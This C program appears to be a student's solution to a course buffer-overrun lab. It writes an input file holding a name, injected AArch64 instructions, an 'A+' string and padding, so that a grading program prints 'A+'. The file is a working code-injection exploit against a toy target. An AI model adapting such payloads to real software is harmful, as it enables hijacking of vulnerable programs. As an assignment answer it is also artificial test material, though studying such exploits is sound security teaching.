#include <stdio.h>
#include "miniassembler.h"
#include <string.h>
int main(void) {
    FILE *dataAplus;
    unsigned int payloadAddress, printfAddress;
    unsigned int ldrInstr, blInstr;

    dataAplus = fopen("dataAplus", "w+");
    if (dataAplus == NULL) {
        perror("Error opening file");
        return -1;
    }

    fprintf(dataAplus, "AnishKatari");
    putc('\0', dataAplus);

    printfAddress = 0x400690; 
    payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064);

    fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);

    unsigned long aPlusStringAddress = 0x420080;
    ldrInstr = MiniAssembler_ldr(0, aPlusStringAddress);
    fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);

    blInstr = MiniAssembler_bl(printfAddress, 0x420084);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    blInstr = MiniAssembler_bl(0x40089c, 0x420088);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    const char *aPlusString = "A+\0";
    fwrite(aPlusString, strlen(aPlusString) + 1, 1, dataAplus);

    for (int i = 0; i < 16; i++) {
        putc('A', dataAplus);
    }

    fclose(dataAplus);
    return 0;
}